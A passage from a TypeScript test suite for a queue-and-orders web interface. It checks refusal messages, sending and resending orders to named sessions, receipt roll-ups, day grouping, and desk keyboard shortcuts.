    { name: "a replaced target names the server's reason", status: 409, answer: { error: "session_replaced", reason: "a replaced session takes no message" }, error: "Refused: a replaced session takes no message." },
    { name: "an unknown target names the server's reason", status: 404, answer: { error: "unknown_session", reason: "every target must be a registered session" }, error: "Refused: every target must be a registered session." },
    { name: "a refusal with no reason shows fixed copy", status: 403, answer: { error: "forbidden" }, error: "The monitor refused this order. Try again." },
  ];
  // spec §4.4: a refused send is followed by a read at once
  for (const row of refusals) {
    test(`a refused send keeps the text and re-reads the page: ${row.name}`, async () => {
      const result = await run(row.status, row.answer);
      assert.equal(result.isDone, false);
      assert.deepEqual(result.composer, { text: "rebase on main", isBusy: false, error: row.error });
      assert.deepEqual([result.statuses, result.sent, result.refused], [[], 0, 1]);
    });
  }

  test("a send during an outage gives the page's outage step", async () => {
    const result = await run(503, { error: "database_unavailable" });
    assert.equal(result.composer.error, call("getActionErrorQ", { status: 503, data: { error: "database_unavailable" } }));
  });

  const sentLines = [
    { name: "one session", names: ["gersona"], line: "✓ Order sent to gersona" },
    { name: "three sessions", names: ["gersona", "yoaida", "atrium"], line: "✓ Order sent to gersona, yoaida and atrium" },
  ];
  for (const row of sentLines) test(`the sent line names every recipient: ${row.name}`, () => assert.equal(call("getOrderSentStatusQ", row.names), row.line));
});

describe("Orders", () => {
  const OTHER_ID = "3d8a51c2-7e04-4b19-a6c3-5f2e9d0b8a17";
  const named = (name: string, id = SESSION_ID) => buildSession({ id, name });
  const copy = (overrides: Record<string, unknown>) => buildItem({ kind: "message", status: "answered", options: [], answeredAt: "2026-11-12T12:26:04.118Z", ...overrides });

  // spec §3.1 → three panes always: nothing is put away for Orders, and nothing opens or closes it
  test("the desk holds Orders beside the middle pane at rest, with nothing put away and no mode", () => {
    const tree = render("QueueDeskQ", { queue: withList(buildQueue().queue, [buildItem({ id: 1 })]) });
    const [desk] = findNodes(tree, (node) => typeof node.props?.className === "string" && node.props.className.startsWith("queue-desk"));
    assert.equal(desk?.props.className, "queue-desk");
    assert.equal(findNodes(tree, (node) => node.props?.hidden === true && node.type === "div" && node.props.className !== "queue-list-slot").length, 0);
    assert.equal(findNodes(tree, (node) => node.type === "OrdersViewQ").length, 1);
  });

  const heads = [
    { name: "nothing ticked → to every session", ids: [], sub: "to every session" },
    { name: "the ticked sessions by name", ids: [SESSION_ID, ENDED_ID], sub: "to nightly-docs-sweep, atrium-hooks" },
  ];
  for (const row of heads) {
    test(`the Orders head names whose orders the thread holds, with no Close and no Clear: ${row.name}`, () => {
      const tree = renderOrders({}, { selectedIds: row.ids, isEndedShown: true });
      const [card] = findNodes(tree, (node) => node.props?.atom === "Card");
      assert.equal(collectText(renderScreen(card?.props.sub) as RenderedNode), row.sub);
      assert.deepEqual(["Close", "Clear", "New order"].map((label) => buttonLabelled(tree, label).length), [0, 0, 0]);
    });
  }

  test("the history read asks for the ticked sessions' orders a page at a time, and Show earlier continues from the cursor", async () => {
    const urls: string[] = [];
    const pages = [
      { items: [copy({ id: 90, sendId: "s2" }), copy({ id: 70, sendId: "s1" })], nextCursor: "1762950364118000:70" },
      { items: [copy({ id: 70, sendId: "s1" }), copy({ id: 40, sendId: "s0" })], nextCursor: null },
    ];
    const module = (await loadScreenModule(QUEUE_SRC, {
      URLSearchParams,
      window: { UI: uiStub() },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => pages[urls.length - 1] };
      },
    })) as ScreenModule;
    let thread: { items: Array<{ id: number }>; nextCursor: string | null } = { items: [], nextCursor: null };
    const setThread = (next: (prev: unknown) => typeof thread) => { thread = next(thread); };
    await (module.getThreadQ as (deps: unknown) => Promise<void>)({ ids: [SESSION_ID, OTHER_ID], before: null, setThread });
    await (module.getThreadQ as (deps: unknown) => Promise<void>)({ ids: [SESSION_ID, OTHER_ID], before: thread.nextCursor, setThread });
    const queries = urls.map((url) => Object.fromEntries(new URL(url, "http://monitor").searchParams));
    assert.deepEqual(urls.map((url) => url.split("?")[0]), ["/api/queue/owner/orders", "/api/queue/owner/orders"]);
    assert.deepEqual(queries, [{ limit: "30", sessionIds: `${SESSION_ID},${OTHER_ID}` }, { limit: "30", sessionIds: `${SESSION_ID},${OTHER_ID}`, before: "1762950364118000:70" }]);
    assert.deepEqual(getPlain(thread.items).map((item) => item.id), [90, 70, 40], "a copy on both pages is kept once");
  });

  // spec §4.4: an arrival never moves the thread → the page's own re-read keeps every loaded order, the oldest one at the top included
  test("an arrival keeps every loaded order: the re-read updates the orders it covers and keeps the ones it pushed past its end", async () => {
    const answer = { items: [copy({ id: 95, sendId: "s3" }), copy({ id: 90, sendId: "s2" }), copy({ id: 70, sendId: "s1", status: "delivered" })], nextCursor: "1762950364118000:70" };
    const module = (await loadScreenModule(QUEUE_SRC, { URLSearchParams, window: { UI: uiStub() }, fetch: async () => ({ status: 200, json: async () => answer }) })) as ScreenModule;
    let thread = { status: "ready", items: [copy({ id: 90, sendId: "s2" }), copy({ id: 70, sendId: "s1" }), copy({ id: 40, sendId: "s0" })], nextCursor: "1762950364118000:40", error: null };
    const setThread = (next: (prev: typeof thread) => typeof thread) => { thread = next(thread); };
    await (module.getThreadQ as (deps: unknown) => Promise<void>)({ ids: [SESSION_ID], before: null, setThread, isQuiet: true });
    const items = getPlain(thread.items) as Array<{ id: number; status: string }>;
    assert.deepEqual([items.map((item) => [item.id, item.status]), thread.nextCursor], [[[95, "answered"], [90, "answered"], [70, "delivered"], [40, "answered"]], "1762950364118000:40"]);
  });

  // a page cap past the server's → every re-read of a long thread is refused and the thread stops updating
  test("the page's history sizes are the server's: its page is the default, and its cap passes where one more does not", () => {
    const ORDERS = vm.runInContext("ORDERS_Q", screen) as { PAGE: number; MAX: number };
    const limit = (value: number) => ownerOrdersQuerySchema.safeParse({ limit: String(value) }).success;
    assert.deepEqual([ownerOrdersQuerySchema.parse({}).limit, limit(ORDERS.MAX), limit(ORDERS.MAX + 1)], [ORDERS.PAGE, true, false]);
  });

  test("no tick reads the orders to every session", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, { URLSearchParams, window: { UI: uiStub() }, fetch: async (url: string) => { urls.push(url); return { status: 200, json: async () => ({ items: [], nextCursor: null }) }; } })) as ScreenModule;
    await (module.getThreadQ as (deps: unknown) => Promise<void>)({ ids: [], before: null, setThread: () => undefined });
    assert.deepEqual(Object.fromEntries(new URL(urls[0] as string, "http://monitor").searchParams), { limit: "30" });
  });

  test("the thread folds the copies of one send into one entry, the oldest order first", () => {
    const items = [
      copy({ id: 91, sendId: "s2", session: named("yoaida", OTHER_ID) }), copy({ id: 90, sendId: "s2" }),
      buildItem({ id: 50, kind: "report", status: "delivered", options: [], answeredAt: "2026-11-11T09:00:00.000Z", answer: { code: null, text: "ship it" } }),
      copy({ id: 31, sendId: null, answeredAt: "2026-11-10T01:00:00.000Z", body: "old", session: named("yoaida", OTHER_ID) }), copy({ id: 30, sendId: null, answeredAt: "2026-11-10T01:00:00.000Z", body: "old" }),
    ];
    const entries = call<Array<{ id: number; copies: Array<{ id: number }> }>>("getThreadEntriesQ", items);
    assert.deepEqual(entries.map((entry) => [entry.id, entry.copies.map((one) => one.id)]), [[30, [30, 31]], [50, [50]], [90, [90, 91]]]);
  });

  test("an order shows its text, a reply to a report leads its time line with Re: and the report's title", () => {
    // the bubble's text rides ProseText's prop → read beside the rendered text
    const text = (item: unknown) => {
      const tree = render("OrderEntryQ", { entry: call<unknown[]>("getThreadEntriesQ", [item])[0], onResend: () => undefined });
      return [collectText(tree), ...findNodes(tree, (node) => node.props?.atom === "ProseText").map((node) => String(node.props.text))].join(" ");
    };
    const message = text(copy({ id: 90, sendId: "s2", body: "rebase on main" }));
    const reply = text(buildItem({ id: 50, kind: "report", title: "Nightly sweep done", status: "delivered", options: [], answeredAt: "2026-11-11T09:00:00.000Z", answer: { code: null, text: "ship it" } }));
    assert.ok(message.includes("rebase on main") && !message.includes("Re:"), message);
    assert.ok(reply.includes("ship it") && reply.includes("Re: Nightly sweep done"), reply);
  });

  test("each recipient shows its one receipt word, and only a recipient that did not receive it can be resent", () => {
    const resent: unknown[] = [];
    const entry = call<unknown[]>("getThreadEntriesQ", [
      copy({ id: 90, sendId: "s2", status: "delivered", deliveredAt: "2026-11-12T12:28:00.000Z", session: named("gersona") }),
      copy({ id: 91, sendId: "s2", session: named("yoaida", OTHER_ID) }),
      copy({ id: 92, sendId: "s2", status: "unacked", canResend: true, session: named("atrium", ENDED_ID) }),
      copy({ id: 93, sendId: "s2", session: buildSession({ id: REPLACED_ID, name: "aidl", state: "live", isWaiting: false }) }),
    ])[0];
    const tree = render("OrderEntryQ", { entry, onResend: (id: number) => resent.push(id) });
    const rows = findNodes(tree, (node) => node.props?.className === "queue-recipient").map((node) => collectText(node));
    assert.deepEqual(
      rows.map((row) => [["gersona", "yoaida", "atrium", "aidl"].find((name) => row.startsWith(name)), ["Received", "Not yet", "Not received", "Next turn"].find((word) => row.includes(word))]),
      [["gersona", "Received"], ["yoaida", "Not yet"], ["atrium", "Not received"], ["aidl", "Next turn"]],
    );
    const resends = buttonLabelled(tree, "Resend");
    assert.equal(resends.length, 1);
    (resends[0]?.props.onClick as () => void)();
    assert.deepEqual(getPlain(resent), [[92]]);
  });

  // the page's one action state (queue.busy) names the copy a resend is for → only that recipient's row shows it
  const resendStates = [
    {
      name: "in flight → the pressed recipient's Resend and Resend to 2 read Resending… and take no press; the other row's stays",
      busy: { id: 92, error: null },
      rows: [["queue-recipient", [["Resend", false, true]], ""], ["queue-recipient", [["Resending…", true, false]], ""]],
      all: [["Resending…", true, false]],
    },
    {
      name: "refused → the reason under that recipient only, every Resend back at rest",
      busy: { id: null, error: { id: 92, message: "Refused: atrium ended." } },
      rows: [["queue-recipient", [["Resend", false, true]], ""], ["queue-recipient", [["Resend", false, true]], ""], ["queue-recipient-refusal", [], "✕ Refused: atrium ended."]],
      all: [["Resend to 2", false, true]],
    },
  ];
  for (const row of resendStates) {
    test(`a recipient's resend: ${row.name}`, () => {
      const thread = { status: "ready", nextCursor: null, error: null, items: [
        copy({ id: 91, sendId: "s3", status: "unacked", canResend: true, session: named("yoaida", OTHER_ID) }),
        copy({ id: 92, sendId: "s3", status: "unacked", canResend: true, session: named("atrium", ENDED_ID) }),
      ] };
      const { queue } = buildQueue({ busy: row.busy, orders: buildOrders({ thread }) });
      const tree = renderCard("OrdersViewQ", { queue: withList(queue, []) });
      const looks = (node: RenderedNode) => findNodes(node, (inner) => inner.type === "button").map((button) => [collectText(button).trim(), button.props["aria-busy"] === true, typeof button.props.onClick === "function"]);
      const [list] = findNodes(tree, (node) => node.props?.className === "queue-recipients");
      const items = findNodes(list as RenderedNode, (node) => node.type === "li").map((item) => [item.props.className, looks(item), findNodes(item, (inner) => inner.type === "p" && inner.props.role === "alert").map((line) => collectText(line).replace(/\s+/g, " ").trim()).join("")]);
      assert.deepEqual(items, row.rows);
      const inList = new Set(findNodes(list as RenderedNode, (node) => node.type === "button"));
      const all = findNodes(tree, (node) => node.type === "button" && !inList.has(node) && /^Resend/.test(collectText(node).trim()));
      assert.deepEqual(all.flatMap(looks), row.all);
    });
  }

  const lines = (count: number) => Array.from({ length: count }, (_, index) => `step ${index + 1}`).join("\n");
  const clamps = [
    { name: "12 lines show in full with no disclosure", body: lines(12), isClamped: false, more: [] },
    { name: "31 lines clamp at 12 under Show all 31 lines", body: lines(31), isClamped: true, more: ["Show all 31 lines"] },
  ];
  for (const row of clamps) {
    test(`an order's bubble: ${row.name}`, () => {
      const tree = render("OrderEntryQ", { entry: call<unknown[]>("getThreadEntriesQ", [copy({ id: 90, sendId: "s2", body: row.body })])[0], onResend: () => undefined });
      const [bubble] = findNodes(tree, (node) => String(node.props?.className ?? "").split(" ").includes("queue-bubble"));
      assert.equal(String(bubble?.props.className).split(" ").includes("is-clamped"), row.isClamped);
      assert.deepEqual(findNodes(tree, (node) => node.type === "summary").map((node) => collectText(node).trim()), row.more);
    });
  }

  const fan = (receipts: string[]) => receipts.map((receipt, index) => copy({
    id: 90 + index, sendId: "s7", session: named(`session-${index}`, randomUUID()),
    ...({
      received: { status: "delivered", deliveredAt: "2026-11-12T12:28:00.000Z" },
      notYet: {},
      notReceived: { status: "unacked", canResend: true },
      nextTurn: { session: buildSession({ id: randomUUID(), name: `session-${index}`, state: "live", isWaiting: false }) },
    } as Record<string, object>)[receipt],
  }));
  test("a roll-up counts the recipients that do not listen as their own segment and keeps them listed under its line", () => {
    const entry = call<unknown[]>("getThreadEntriesQ", fan(["received", "received", "received", "received", "notYet", "nextTurn"]))[0];
    const tree = render("OrderEntryQ", { entry, onResend: () => undefined });
    const [rollUp] = findNodes(tree, (node) => node.type === "summary");
    const [details] = findNodes(tree, (node) => node.type === "details");
    const outside = findNodes(tree, (node) => node.props?.className === "queue-recipient").filter((node) => !findNodes(details as RenderedNode, (inner) => inner === node).length);
    const line = collectText(rollUp as RenderedNode).replace(/\s+/g, " ");
    assert.deepEqual(
      [line.includes("6 sessions · 4 received · 1 not yet · 1 next turn"), outside.map((node) => collectText(node).split(/Next turn|Not /)[0]?.trim())],
      [true, ["session-5"]],
      line,
    );
  });
  test("five recipients or more fold into one roll-up line; a recipient that did not receive it stays listed under it", () => {
    const entry = call<unknown[]>("getThreadEntriesQ", fan(["received", "received", "received", "received", "received", "notYet", "notReceived"]))[0];
    const tree = render("OrderEntryQ", { entry, onResend: () => undefined });
    const [rollUp] = findNodes(tree, (node) => node.type === "summary");
    const line = collectText(rollUp as RenderedNode).replace(/\s+/g, " ");
    assert.ok(line.includes("7 sessions · 5 received · 1 not yet"), line);
    assert.ok(line.includes("1 not received"), line);
    const [details] = findNodes(tree, (node) => node.type === "details");
    const outside = findNodes(tree, (node) => node.props?.className === "queue-recipient").filter((node) => !findNodes(details as RenderedNode, (inner) => inner === node).length);
    assert.deepEqual(outside.map((node) => collectText(node).split(/Next turn|Not /)[0]?.trim()), ["session-6"]);
    assert.equal(findNodes(details as RenderedNode, (node) => node.props?.className === "queue-recipient").length, 6, "the not received one is listed once, outside");
  });

  test("four recipients keep a row each and no roll-up line", () => {
    const tree = render("OrderEntryQ", { entry: call<unknown[]>("getThreadEntriesQ", fan(["received", "notYet", "notYet", "notReceived"]))[0], onResend: () => undefined });
    assert.equal(findNodes(tree, (node) => node.type === "details").length, 0);
    assert.equal(findNodes(tree, (node) => node.props?.className === "queue-recipient").length, 4);
  });

  const resendAlls = [
    { name: "two that can be resent → Resend to 2, sent to those two only", receipts: ["received", "notReceived", "notYet", "notReceived"], label: ["Resend to 2"], ids: [91, 93] },
    { name: "one that can be resent → its own Resend only", receipts: ["received", "notReceived"], label: [], ids: [] },
  ];
  for (const row of resendAlls) {
    test(`resending several recipients: ${row.name}`, () => {
      const resent: unknown[] = [];
      const tree = render("OrderEntryQ", { entry: call<unknown[]>("getThreadEntriesQ", fan(row.receipts))[0], onResend: (ids: unknown) => resent.push(getPlain(ids)) });
      const all = findNodes(tree, (node) => node.type === "button" && /^Resend to /.test(collectText(node).trim()));
      assert.deepEqual(all.map((node) => collectText(node).trim()), row.label);
      if (all[0]) (all[0].props.onClick as () => void)();
      assert.deepEqual(resent, all[0] ? [row.ids] : []);
    });
  }

  // days are KST days: 15:30Z is already the next day in Seoul
  test("the thread's day labels group orders by KST day: Today, Yesterday, else the date", () => {
    const at = (answeredAt: string, id: number) => ({ id, item: { answeredAt }, copies: [] });
    const entries = [at("2026-11-10T03:00:00.000Z", 1), at("2026-11-11T14:59:00.000Z", 2), at("2026-11-11T15:01:00.000Z", 3), at("2026-11-12T15:30:00.000Z", 4)];
    const groups = call<Array<{ label: string; entries: Array<{ id: number }> }>>("getDayGroupsQ", entries, new Date("2026-11-12T16:00:00.000Z"));
    assert.deepEqual(groups.map((group) => [group.label, group.entries.map((entry) => entry.id)]), [["2026-11-10", [1]], ["2026-11-11", [2]], ["Yesterday", [3]], ["Today", [4]]]);
  });

  // spec §9.2 → Label line: every receiving session by name, an ended, not reachable or next-turn one marked bare, its word spoken; none → said, all of it dim
  const labelLines = [
    { name: "the ticked names, an ended one tagged", ids: [SESSION_ID, ENDED_ID], text: "New order to nightly-docs-sweep, atrium-hooks", marks: ["Ended"] },
    { name: "no tick says so", ids: [], text: "New order · no session ticked", marks: [] },
    { name: "a ticked session that does not listen is marked, its word read with its name", ids: [OTHER_RAIL_ID, SESSION_ID], text: "New order to nightly-docs-sweep, yoaida", marks: ["Next turn"], rows: [...SESSION_ROWS, buildSessionRow({ id: OTHER_RAIL_ID, name: "yoaida", isWaiting: false })] },
    {
      name: "a marked name that is not last keeps its mark before the comma",
      ids: [ENDED_ID, OTHER_RAIL_ID, SESSION_ID],
      text: "New order to atrium-hooks, yoaida, nightly-docs-sweep", marks: ["Ended", "Next turn"],
      rows: [SESSION_ROWS[1], buildSessionRow({ id: OTHER_RAIL_ID, name: "yoaida", isWaiting: false }), SESSION_ROWS[0]],
    },
    {
      name: "a ticked session that is not reachable takes the rail's warn mark, not the pause mark",
      ids: [OTHER_RAIL_ID],
      text: "New order to yoaida ⚠", marks: ["Not reachable"],
      rows: [...SESSION_ROWS, buildSessionRow({ id: OTHER_RAIL_ID, name: "yoaida", state: "stale", isWaiting: false })],
    },
  ];
  for (const row of labelLines) {
    test(`the Orders composer's label line: ${row.name}`, () => {
      const region = row.rows ? { region: { status: "ready", data: { sessions: row.rows, hasMore: false }, error: null, busy: false } } : {};
      const tree = renderOrders({}, { selectedIds: row.ids, isEndedShown: true, ...region });
      const [label] = findNodes(tree, (node) => node.type === "label" && String(node.props.className).includes("field-label"));
      const marks = findNodes(label as RenderedNode, (node) => node.props?.role === "img").map((node) => node.props["aria-label"]);
      // collectText joins siblings with a space → a comma that follows its name in the DOM is joined back
      assert.deepEqual([collectText(label as RenderedNode).replace(/\s+/g, " ").replace(/ ,/g, ",").trim(), marks], [row.text, row.marks]);
    });
  }
});

// a focused element on the desk: `inside` = the selectors it sits within, `session` = the rail row it sits in
function buildKeyTarget({ tag = "DIV", type = "", inside = [] as string[], session = "" } = {}) {
  return {
    tagName: tag,
    type,
    isContentEditable: false,
    closest: (selector: string) => {
      if (selector === "[data-session]") return session ? { getAttribute: () => session } : null;
      return selector.split(",").some((part) => inside.includes(part.trim())) ? { querySelector: (inner: string) => keyRoot.querySelector(inner) } : null;
    },
  };
}

// document stand-in: each element the handlers reach records what was done to it
const keyActs: string[] = [];
const keyElement = (name: string) => ({ focus: () => keyActs.push(`focus ${name}`), click: () => keyActs.push(`click ${name}`) });
const keyRoot = {
  elements: {} as Record<string, unknown>,
  querySelector(selector: string) { return this.elements[selector] ?? null; },
  getElementById(id: string) { return this.elements[`#${id}`] ?? null; },
};

describe("desk keys", () => {
  const OTHER_TICK_ID = "8c41e7d2-5b9a-4f06-b3e1-7d2a6c9f0e58";
  const desk = buildKeyTarget();
  const sheet = buildKeyTarget({ inside: [".queue-sheet"] });
  const rows = [
    { name: "J selects the next row", key: "j", expected: { name: "next" } },
    { name: "K selects the previous row", key: "k", expected: { name: "prev" } },
    { name: "a capital letter is its key", key: "J", expected: { name: "next" } },
    { name: "a digit picks the option at its position", key: "3", expected: { name: "pick", index: 2 } },
    { name: "zero picks nothing", key: "0", expected: null },
    { name: "R goes to the sheet's field", key: "r", expected: { name: "field" } },
    { name: "E marks as read", key: "e", expected: { name: "read" } },
    { name: "L puts it later", key: "l", expected: { name: "later" } },
    { name: "N starts a new order", key: "n", expected: { name: "new" } },
    { name: "O orders the selected item's session", key: "o", expected: { name: "order" } },
    { name: "a letter with Cmd is the browser's", key: "j", metaKey: true, expected: null },
    { name: "a letter with Alt is the browser's", key: "n", altKey: true, expected: null },
    { name: "a letter typed in a text field is text", key: "j", target: buildKeyTarget({ tag: "TEXTAREA", inside: [".queue-sheet"] }), expected: null },
    { name: "a letter typed in a text input is text", key: "e", target: buildKeyTarget({ tag: "INPUT", type: "text" }), expected: null },
    { name: "a letter on a radio is a key", key: "2", target: buildKeyTarget({ tag: "INPUT", type: "radio", inside: [".queue-sheet"] }), expected: { name: "pick", index: 1 } },
    { name: "the switch off leaves letters alone", key: "j", isKeysOn: false, expected: null },
    { name: "the switch off leaves digits alone", key: "1", isKeysOn: false, expected: null },
    { name: "the switch off keeps Esc", key: "Escape", target: sheet, isKeysOn: false, expected: { name: "back" } },
    { name: "Esc in the sheet goes back to the selected row", key: "Escape", target: sheet, expected: { name: "back" } },
    { name: "Esc in the sheet's field goes back too", key: "Escape", target: buildKeyTarget({ tag: "TEXTAREA", inside: [".queue-sheet"] }), expected: { name: "back" } },
    { name: "Esc on the list does nothing", key: "Escape", expected: null },
    { name: "Esc in Orders gives the focus back to the middle pane", key: "Escape", target: buildKeyTarget({ inside: [".queue-orders"] }), expected: { name: "leave" } },
    { name: "Esc in the Orders box gives it back too", key: "Escape", target: buildKeyTarget({ tag: "TEXTAREA", inside: [".queue-orders"] }), expected: { name: "leave" } },
    { name: "an open dialog takes the Esc first", key: "Escape", target: buildKeyTarget({ inside: ['[role="dialog"]', ".queue-orders"] }), expected: null },
    { name: "an open dialog takes the letters too", key: "j", target: buildKeyTarget({ inside: ['[role="dialog"]'] }), expected: null },
    { name: "a key another handler took is left alone", key: "Escape", target: sheet, defaultPrevented: true, expected: null },
    { name: "Enter on a row goes into the sheet", key: "Enter", target: buildKeyTarget({ inside: ['[role="option"]'] }), expected: { name: "enter" } },
    { name: "Enter elsewhere is the control's own", key: "Enter", target: sheet, expected: null },
    { name: "Cmd+Enter in the sheet presses its send", key: "Enter", metaKey: true, target: sheet, expected: { name: "send" } },
    { name: "Ctrl+Enter in Orders presses its send", key: "Enter", ctrlKey: true, target: buildKeyTarget({ inside: [".queue-orders"] }), expected: { name: "send" } },
    { name: "Cmd+Enter on the list does nothing", key: "Enter", metaKey: true, target: buildKeyTarget({ inside: ['[role="option"]'] }), expected: null },
    { name: "Orders keeps N", key: "n", target: buildKeyTarget({ inside: [".queue-orders"] }), expected: { name: "new" } },
    { name: "Orders leaves the list's letters", key: "j", target: buildKeyTarget({ inside: [".queue-orders"] }), expected: null },
    { name: "Orders leaves the option digits", key: "1", target: buildKeyTarget({ inside: [".queue-orders"] }), expected: null },
  ];
  for (const row of rows) {
    test(`a desk key: ${row.name}`, () => {
      const event = { key: row.key, metaKey: row.metaKey ?? false, ctrlKey: row.ctrlKey ?? false, altKey: row.altKey ?? false, defaultPrevented: row.defaultPrevented ?? false, target: row.target ?? desk };
      assert.deepEqual(call("getDeskKeyQ", event, { isKeysOn: row.isKeysOn ?? true }), row.expected);
    });
  }

  const decision = buildItem({ id: 3 });
  const report = buildItem({ id: 5, kind: "report", options: [] });
  const order = buildItem({ id: 9, kind: "message", status: "answered", sendId: "s", options: [], session: buildSession({ id: ENDED_ID }) });
  // the desk with `selected` on the sheet (0 → the list, nothing open); `calls` records every queue act a key makes
  const deskWith = (selected: number, sessions: Record<string, unknown> = {}) => {
    const built = buildQueue({ sessions: buildSessions(sessions), openOrderRow: (row: { id: number }) => built.calls.push(["openOrderRow", row.id]) });
    const listed = withList(built.queue, [decision, report, order]);
    const groups = listed.groups as Array<{ rows: Array<{ id: number }> }>;
    const sheet = getSheet(groups, selected ? String(selected) : "");
    return { calls: built.calls, queue: { ...listed, sheet, selectedId: selected || null, steps: call("getStepsQ", groups, sheet.id, -1) } };
  };
  const press = (name: string, selected: number, extra: Record<string, unknown> = {}) => {
    keyActs.length = 0;
    const { calls, queue } = deskWith(selected, extra.sessions as Record<string, unknown>);
    (screen.putDeskKeyQ as (a: unknown, c: unknown) => void)({ name, index: extra.index }, { queue, target: extra.target ?? desk, root: keyRoot });
    return { calls: getPlain(calls), acts: [...keyActs] };
  };

  const sheetSteps = [
    { name: "J on a decision's sheet opens the report after it", action: "next", selected: 3, expected: [["selectRow", 5]] },
    { name: "K on the report's sheet opens the decision before it", action: "prev", selected: 5, expected: [["selectRow", 3]] },
    { name: "J on the last sheet passes over the order's row and opens nothing", action: "next", selected: 5, expected: [] },
  ];
  for (const row of sheetSteps) test(`a key's act: ${row.name}`, () => assert.deepEqual(press(row.action, row.selected).calls, row.expected));

  const rowTarget = (id: number) => ({ ...buildKeyTarget({ inside: ['[role="option"]'] }), closest: (selector: string) => (selector === '[role="option"]' ? { id: `queue-row-${id}` } : null) });
  const listSteps = [
    { name: "J on the list focuses the row after the focused one and opens nothing", action: "next", target: rowTarget(3), expected: "focus row 5" },
    { name: "K on the list focuses the row before the focused one", action: "prev", target: rowTarget(9), expected: "focus row 5" },
    { name: "J with no row focused focuses the first row", action: "next", target: undefined, expected: "focus row 3" },
  ];
  for (const row of listSteps) {
    test(`a key's act: ${row.name}`, () => {
      keyRoot.elements = { "#queue-row-3": keyElement("row 3"), "#queue-row-5": keyElement("row 5"), "#queue-row-9": keyElement("row 9") };
      const pressed = press(row.action, 0, { target: row.target });
      assert.deepEqual([pressed.acts, pressed.calls], [[row.expected], []]);
    });
  }

  test("Enter on a row opens its sheet", () => assert.deepEqual(press("enter", 0, { target: rowTarget(5) }).calls, [["selectRow", 5]]));

  test("Enter on an order's row shows its entry in Orders and opens no sheet", () => assert.deepEqual(press("enter", 0, { target: rowTarget(9) }).calls, [["openOrderRow", 9]]));

  const picks = [
    { name: "a digit on an open decision picks that option", selected: 3, index: 1, expected: [["setDraft", 3, { code: "R2", error: null }]] },
    { name: "a digit past the last option picks nothing", selected: 3, index: 4, expected: [] },
    { name: "a digit on a report picks nothing", selected: 5, index: 0, expected: [] },
  ];
  for (const row of picks) test(`a key's act: ${row.name}`, () => assert.deepEqual(press("pick", row.selected, { index: row.index }).calls, row.expected));

  const presses = [
    { name: "E presses the sheet's Mark as read", action: "read", selector: '.queue-sheet [data-key="e"]' },
    { name: "L presses the sheet's later button", action: "later", selector: '.queue-sheet [data-key="l"]' },
  ];
  for (const row of presses) {
    test(`a key's act: ${row.name}`, () => {
      keyRoot.elements = { [row.selector]: keyElement(row.action) };
      assert.deepEqual(press(row.action, 5).acts, [`click ${row.action}`]);
    });
  }

  test("R puts the caret in the sheet's field", () => {
    keyRoot.elements = { ".queue-sheet .queue-compose-text": keyElement("field") };
    assert.deepEqual(press("field", 5).acts, ["focus field"]);
  });

  test("Esc from the sheet goes back to the list", () => assert.deepEqual(press("back", 5).calls, [["back"]]));

  test("Cmd+Enter presses the send-keyed button of the pane holding the focus, else its primary one", () => {
    keyRoot.elements = { '.queue-composer [data-key="send"], .queue-composer .btn.primary': keyElement("Send answer") };
    assert.deepEqual(press("send", 3, { target: sheet }).acts, ["click Send answer"]);
  });

  // spec §9.2 → Foot, §11: in Orders the send key answers as a press of the send button does, inked or not
  // → the rendered order composer, a key on its box bubbling to the desk as the page wires it
  const ordersKeyDesk = async (targets: { ids: string[]; names: string[]; endedCount: number }) => {
    const focused: string[] = [];
    const sent: unknown[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub(), document: { querySelector: (selector: string) => ({ focus: () => focused.push(selector) }), getElementById: (id: string) => ({ focus: () => focused.push(`#${id}`) }) } },
    })) as ScreenModule;
    const composer: Record<string, unknown> = { text: "rebase on main", isBusy: false, error: null };
    const orders = buildOrders({ composer, putError: (error: unknown) => { composer.error = error; }, send: (body: unknown) => sent.push(getPlain(body)) });
    const queue = withList(buildQueue({ orders }).queue, []);
    const draw = () => {
      const box = (module.getOrderBoxQ as (q: unknown) => unknown)(queue);
      const tray = (module.getTrayQ as (o: unknown) => unknown)({ fieldId: "queue-order-text", box });
      return renderScreen((module.React as typeof screen.React).createElement(module.OrderComposerQ as Component, { queue, targets, box, tray })) as RenderedNode;
    };
    const tree = draw();
    // the pane's querySelector, read off the rendered composer by each listed selector's last part (classes and one attribute), the first match winning
    const findBySelector = (selector: string) => {
      const last = selector.trim().split(/\s+/).pop() ?? "";
      const attr = /\[([\w-]+)="([^"]*)"\]/.exec(last);
      const classes = last.replace(/\[.*\]/, "").split(".").filter(Boolean);
      return findNodes(tree, (one) => {
        const names = String(one.props?.className ?? "").split(/\s+/);
        return (classes.length > 0 || attr !== null) && classes.every((name) => names.includes(name)) && (!attr || one.props?.[attr[1]] === attr[2]);
      })[0];
    };
    const pane = {
      querySelector: (selector: string) => {
        const node = selector.split(",").map(findBySelector).find(Boolean);
        return node ? { click: () => (node.props.onClick as (() => void) | undefined)?.(), focus: () => focused.push(selector) } : null;
      },
    };
    const inOrders = (tag: string) => ({ tagName: tag, type: "", isContentEditable: false, closest: (selector: string) => (selector.split(",").some((part) => part.trim() === ".queue-orders") ? pane : null) });
    // the key on `target`: the box's own handler first when the focus is in it, then the desk's unless the box took it
    const pressSend = (target: ReturnType<typeof inOrders>) => {
      const event = { key: "Enter", metaKey: true, ctrlKey: false, altKey: false, defaultPrevented: false, target, preventDefault() { this.defaultPrevented = true; } };
      if (target.tagName === "TEXTAREA") {
        const [field] = findNodes(tree, (one) => one.type === "textarea");
        (field?.props.onKeyDown as (e: unknown) => void)(event);
      }
      const action = (module.getDeskKeyQ as (e: unknown, o: unknown) => { name: string } | null)(event, { isKeysOn: true });
      if (action) (module.putDeskKeyQ as (a: unknown, c: unknown) => void)(action, { queue, target, root: pane });
    };
    return { focused, sent, composer, draw, pressSend, inOrders };
  };

  const untickedSends = [
    { name: "in the Orders box", tag: "TEXTAREA" },
    { name: "elsewhere in Orders", tag: "DIV" },
  ];
  for (const row of untickedSends) {
    test(`Cmd+Enter ${row.name} with nothing ticked sends nothing, says the tick is missing and focuses the rail, as the button does`, async () => {
      const desk = await ordersKeyDesk({ ids: [], names: [], endedCount: 0 });
      desk.pressSend(desk.inOrders(row.tag));
      assert.deepEqual([desk.sent, desk.composer.error, desk.focused], [[], "Tick at least one session in the rail.", [".queue-sessions .ctl-checkbox"]]);
